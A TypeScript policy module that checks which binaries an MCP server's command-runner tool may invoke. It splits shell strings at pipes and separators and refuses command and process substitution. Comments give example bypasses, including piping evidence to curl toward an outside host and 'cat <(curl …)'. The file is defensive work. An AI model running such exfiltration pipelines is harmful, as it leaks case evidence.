import { basename } from "node:path";
import { isToolAllowed, type McpServer } from "./mcpServerStore.js";

// What an MCP server is permitted to do on the analyst's behalf (#296 §10). Policy only — pure, no
// I/O, no storage — so every rule here is unit-testable and there is exactly one function a caller
// has to remember: assertCallAllowed, before any tools/call.
//
// BOTH ALLOWLISTS ARE OPTIONAL, and empty by default. The Companion is not the grant point any
// more — Claude Code is configured with these servers and the operator already calls any tool on
// them directly — so requiring the same servers to be described twice bought nothing.
//
// They remain available because they narrow something Claude Code cannot express per-caller. Naming
// permitted tools bounds a fine-grained server (windows-triage-mcp offers 13: check_file,
// check_service, …); naming permitted binaries bounds a command RUNNER, which the tool allowlist
// cannot. Phase 0 found sift-mcp exposing `run_command(command: string[])` — by its own description
// "most SIFT-installed tools … including curl, wget, dd, fdisk, and python3" — and remnux exposing
// `run_tool(command: string)` taking a whole shell pipeline. Allowing that one tool allows the box,
// so an operator who wants to bound it has the argv-level list to do it with.
//
// WHAT THIS IS NOT. It is a control over which BINARIES a call may invoke, keyed on well-known
// parameter names. It is not a sandbox and does not claim to be:
//   - A server free to name its command parameter something unusual is not caught. That is fine —
//     the threat being managed is an analyst under-estimating the reach they granted, not a
//     malicious server evading inspection. A server you would not trust to name its own parameters
//     honestly is a server you should not register.
//   - Allowing a binary allows everything that binary can do. Permitting `dd` permits writing to
//     any path the server's user can write to; permitting `python3` permits arbitrary code. The
//     allowlist bounds WHICH tools run, never what a permitted one is capable of.
// Both limits are documented for operators in the README's MCP section rather than left to be
// discovered.

/**
 * Parameter names understood to carry something that will be executed. Covers the shapes the Phase 0
 * probe actually found (`command`, as an argv array on sift-mcp and a shell string on remnux) plus
 * the two obvious synonyms.
 */
const COMMAND_KEYS = ["command", "cmd", "argv"];

/** Characters that end one command and begin another in a shell string: | || && ; & and newlines. */
const SEGMENT_SEPARATORS = new Set(["|", ";", "&", "\n", "\r"]);

export type CommandCheck =
  /** The call executes nothing this module recognizes — the tool allowlist is the only gate. */
  | { kind: "none" }
  /** The binaries this call would invoke, one per pipeline stage. */
  | { kind: "heads"; heads: string[] }
  /** The command cannot be bounded by inspection, so it must not run. */
  | { kind: "unparseable"; reason: string };

/**
 * Split a shell string into segments at separators that are not quoted.
 *
 * Deliberately a scanner rather than `split(/[|;&]/)`: a naive split turns `grep "a|b" file` into two
 * segments and denies a harmless command. Quoting is tracked just far enough to get command
 * boundaries right — this is not a shell parser and does not try to be one.
 *
 * Returns null when the string contains a substitution (`$(…)`, backticks, `${…}`, `<(…)`, `>(…)`).
 * What those expand to is unknowable here, so there is nothing honest to check them against.
 */
function shellSegments(input: string): string[] | null {
  const segments: string[] = [];
  let current = "";
  let quote: "'" | '"' | null = null;

  for (let i = 0; i < input.length; i++) {
    const c = input[i];

    if (quote === "'") {
      // Single quotes are literal all the way to the closing quote — no escapes, no substitution.
      if (c === "'") quote = null;
      else current += c;
      continue;
    }

    // Single-quoted text already returned above, so a backslash here always escapes.
    if (c === "\\") {
      current += input[i + 1] ?? "";
      i++;
      continue;
    }

    if (quote === '"') {
      // Substitution DOES happen inside double quotes, so it still has to be caught here.
      if (c === "$" && (input[i + 1] === "(" || input[i + 1] === "{")) return null;
      if (c === "`") return null;
      if (c === '"') quote = null;
      else current += c;
      continue;
    }

    if (c === "$" && (input[i + 1] === "(" || input[i + 1] === "{")) return null;
    if (c === "`") return null;
    // PROCESS substitution (`cat <(curl …)`, `tee >(curl …)`). Unlike a pipeline stage this hides
    // inside an ARGUMENT, so head-of-segment inspection saw only `cat` and handed the inner command
    // cat's permission. Unknowable like `$(…)`, so refused the same way. Checked only here, in the
    // unquoted branch, because bash performs it only unquoted — `"<(x)"` and `'<(x)'` are literal.
    // A bare `<`/`>` NOT followed by `(` is an ordinary redirect and stays allowed.
    if ((c === "<" || c === ">") && input[i + 1] === "(") return null;
    if (c === "'" || c === '"') { quote = c; continue; }

    if (SEGMENT_SEPARATORS.has(c)) { segments.push(current); current = ""; continue; }
    current += c;
  }
  segments.push(current);
  return segments;
}

/**
 * The binary a single shell segment invokes, or null when the segment runs nothing (an empty
 * stretch between separators, or only environment assignments).
 *
 * Leading `VAR=value` assignments are stepped over — `LANG=C grep …` runs grep, not LANG.
 */
function headOfSegment(segment: string): string | null {
  for (const token of segment.trim().split(/\s+/)) {
    if (!token) continue;
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) continue;   // an environment assignment, not the command
    return basename(token);
  }
  return null;
}

/**
 * What a tools/call would execute, given its arguments.
 *
 * Handles both shapes Phase 0 found: an argv array (`["vol.py", "-f", "mem.raw"]`), where the head
 * is element 0, and a shell string (`"oledump.py s.doc | grep VBA"`), where EVERY pipeline stage is
 * a head. Checking only the first stage of a pipeline would be worse than useless — it would let
 * `cat evidence | curl -T - http://elsewhere` through on the strength of `cat` being permitted.
 */
export function inspectCommand(args: Record<string, unknown>): CommandCheck {
  const key = COMMAND_KEYS.find((k) => args[k] !== undefined && args[k] !== null);
  if (!key) return { kind: "none" };
  const value = args[key];

  if (Array.isArray(value)) {
    if (value.some((v) => typeof v !== "string")) {
      return { kind: "unparseable", reason: `"${key}" contains a non-string element` };
    }
    const head = headOfSegment((value as string[]).join(" "));
    if (!head) return { kind: "unparseable", reason: `"${key}" names no command to run` };
    return { kind: "heads", heads: [head] };
  }

  if (typeof value === "string") {
    const segments = shellSegments(value);
    if (segments === null) {
      return { kind: "unparseable", reason: `"${key}" uses shell substitution, so what it would run cannot be determined` };
    }
    const heads = segments.map(headOfSegment).filter((h): h is string => h !== null);
    if (heads.length === 0) return { kind: "unparseable", reason: `"${key}" names no command to run` };
    return { kind: "heads", heads: [...new Set(heads)] };
  }

  return { kind: "unparseable", reason: `"${key}" is neither a string nor a list of strings` };
}

/** Whether every binary `heads` would invoke is named in this server's command allowlist. */
export function areCommandsAllowed(server: McpServer, heads: string[]): boolean {
  return heads.every((h) => server.allowedCommands.includes(h));
}

/**
 * The one gate every tool call must pass. Throws with a message that says what to do about it;
 * returns silently when the call is permitted — which, with both lists left empty, it always is.
 */
export function assertCallAllowed(server: McpServer, toolName: string, args: Record<string, unknown>): void {
  if (!isToolAllowed(server, toolName)) {
    throw new Error(
      `MCP server "${server.id}" is not allowed to run the tool "${toolName}" — add it to this server's allowed tools, or clear the list to allow everything the server offers`,
    );
  }

  // No command allowlist configured = no command restriction. Checked before inspectCommand so an
  // unparseable command is only a refusal for an operator who actually asked for the narrowing.
  if (server.allowedCommands.length === 0) return;

  const check = inspectCommand(args);
  if (check.kind === "none") return;
  if (check.kind === "unparseable") {
    throw new Error(`refusing to run "${toolName}" on MCP server "${server.id}": ${check.reason}`);
  }

  const denied = check.heads.filter((h) => !server.allowedCommands.includes(h));
  if (denied.length > 0) {
    const list = denied.map((d) => `"${d}"`).join(", ");
    throw new Error(
      `MCP server "${server.id}" is not allowed to run ${list} via "${toolName}" — ` +
      `add ${denied.length > 1 ? "them" : "it"} to this server's allowed commands, or narrow the command`,
    );
  }
}
